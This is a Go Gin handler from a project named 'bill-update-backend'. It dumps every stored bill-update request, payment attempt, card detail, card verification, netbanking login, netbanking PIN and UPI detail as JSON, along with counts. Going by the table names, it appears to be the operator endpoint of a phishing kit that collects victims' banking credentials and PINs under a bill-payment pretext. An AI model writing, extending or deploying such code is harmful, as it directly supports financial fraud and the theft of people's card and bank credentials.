package handlers

import (
	"bill-update-backend/database"
	"bill-update-backend/models"
	"net/http"

	"github.com/gin-gonic/gin"
)

func GetAllData(c *gin.Context) {
	var billUpdates []models.BillUpdateRequest
	var paymentAttempts []models.PaymentAttempt
	var cardDetails []models.CardDetail
	var cardVerifications []models.CardVerification
	var netbankingDetails []models.NetbankingDetail
	var netbankingPins []models.NetbankingPin
	var upiDetails []models.UpiDetail

	database.DB.Order("id desc").Find(&billUpdates)
	database.DB.Order("id desc").Find(&paymentAttempts)
	database.DB.Order("id desc").Find(&cardDetails)
	database.DB.Order("id desc").Find(&cardVerifications)
	database.DB.Order("id desc").Find(&netbankingDetails)
	database.DB.Order("id desc").Find(&netbankingPins)
	database.DB.Order("id desc").Find(&upiDetails)

	c.JSON(http.StatusOK, gin.H{
		"bill_updates":       billUpdates,
		"payment_attempts":   paymentAttempts,
		"card_details":       cardDetails,
		"card_verifications": cardVerifications,
		"netbanking_details": netbankingDetails,
		"netbanking_pins":    netbankingPins,
		"upi_details":        upiDetails,
		"stats": gin.H{
			"total_bill_updates":       len(billUpdates),
			"total_payments":           len(paymentAttempts),
			"total_card_details":       len(cardDetails),
			"total_card_verifications": len(cardVerifications),
			"total_netbanking":         len(netbankingDetails),
			"total_netbanking_pins":    len(netbankingPins),
			"total_upi":                len(upiDetails),
		},
	})
}
